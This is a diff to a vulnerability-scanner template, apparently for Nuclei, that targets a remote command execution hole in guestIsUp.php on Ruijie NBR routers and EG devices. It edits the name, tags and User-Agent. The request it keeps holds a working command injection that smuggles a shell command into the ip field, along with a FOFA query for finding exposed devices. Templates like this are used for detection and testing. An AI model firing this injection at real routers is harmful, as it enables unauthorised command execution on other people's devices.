@@ -1,13 +1,12 @@
 id: ruijie-eg-and-nbr-guest-auth-guestisup-rce
 
 info:
-  name: ruijie-guest-auth-guestIsup-rce
+  name: 锐捷NBR路由器、锐捷EG易网管guestisup.php远程命令执行漏洞
   author: xy
   severity: critical
-  description: 锐捷NBR路由器、锐捷EG易网管guestisup.php远程命令执行漏洞
   reference:
     - https://blog.csdn.net/CCPxxxXxxx/article/details/119363934
-  tags: ruijie,rce
+  tags: ruijie,rce,iot,router
   metadata:
     veified: true
     fofa-query: fid="BcZWN696xewWLAncU/0IiA=="
@@ -18,7 +17,7 @@ http:
       - |
         POST /guest_auth/guestIsUp.php HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 
         mac=1&ip=127.0.0.1|df > {{randstr}}.txt
 
